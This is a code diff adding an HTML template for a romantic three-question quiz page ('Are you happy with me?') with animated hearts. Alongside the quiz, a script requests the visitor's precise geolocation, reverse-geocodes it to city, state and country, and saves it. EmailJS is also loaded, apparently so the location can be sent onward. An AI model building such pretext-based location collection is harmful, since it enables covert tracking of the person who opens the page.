@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
+
+    <title>Questions ❤️</title>
+
+    <link rel="stylesheet"
+          href="{{ url_for('static', filename='css/questions.css') }}">
+
+</head>
+
+<body>
+
+
+<!-- Background -->
+
+<div class="bg"></div>
+
+
+<!-- Floating Hearts -->
+
+<div id="hearts"></div>
+
+
+<!-- Question Container -->
+
+<section class="question-section">
+
+
+    <div class="progress">
+
+        <div id="progressBar"></div>
+
+    </div>
+
+
+
+    <div class="question-card">
+
+
+        <h3 id="questionNumber">
+
+            Question 1 / 3
+
+        </h3>
+
+
+        <h1 id="questionText">
+
+            Are you happy with me? ❤️
+
+        </h1>
+
+
+
+        <div class="buttons">
+
+
+            <button class="yes">
+
+                ❤️ Yes
+
+            </button>
+
+
+            <button class="no">
+
+                💔 No
+
+            </button>
+
+
+            <button class="skip">
+
+                ⏭ Skip
+
+            </button>
+
+
+        </div>
+
+
+    </div>
+
+
+</section>
+
+    <!-- Floating Hearts Script -->
+
+    <script>
+
+        for(let i=0;i<25;i++){
+
+            const heart=document.createElement("div");
+
+            heart.className="heart";
+
+            heart.innerHTML="❤️";
+
+            heart.style.left=Math.random()*100+"vw";
+
+            heart.style.animationDuration=(5+Math.random()*5)+"s";
+
+            heart.style.animationDelay=Math.random()*5+"s";
+
+            document.getElementById("hearts").appendChild(heart);
+
+        }
+
+    </script>
+
+
+<!-- GSAP Animation Library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+    emailjs.init("YmlWPq-YClKFgfngP");
+</script>
+
+<script>
+let userLocation = {
+    status: "Not Allowed",
+    latitude: "",
+    longitude: "",
+    accuracy: "",
+    city: "",
+    state: "",
+    country: ""
+};
+
+if ("geolocation" in navigator) {
+
+    navigator.geolocation.getCurrentPosition(
+
+        function(position){
+
+            userLocation.status = "Allowed";
+            userLocation.latitude = position.coords.latitude;
+            userLocation.longitude = position.coords.longitude;
+            userLocation.accuracy = position.coords.accuracy;
+
+            // Reverse Geocoding
+            fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
+            )
+            .then(response => response.json())
+            .then(data => {
+
+                const address = data.address || {};
+
+                userLocation.city =
+                    address.city ||
+                    address.town ||
+                    address.village ||
+                    "";
+
+                userLocation.state =
+                    address.state || "";
+
+                userLocation.country =
+                    address.country || "";
+
+                // Save everything
+                localStorage.setItem(
+                    "userLocation",
+                    JSON.stringify(userLocation)
+                );
+
+            })
+            .catch(error => {
+                console.error("Reverse Geocoding Error:", error);
+
+                localStorage.setItem(
+                    "userLocation",
+                    JSON.stringify(userLocation)
+                );
+            });
+
+        },
+
+        function(error){
+
+            console.log("Location Permission Denied");
+
+            localStorage.setItem(
+                "userLocation",
+                JSON.stringify(userLocation)
+            );
+
+        }
+
+    );
+
+}
+</script>
+
+<!-- Question JS -->
+<script src="{{ url_for('static', filename='js/questions.js') }}"></script>
+
+</body>
+</html>
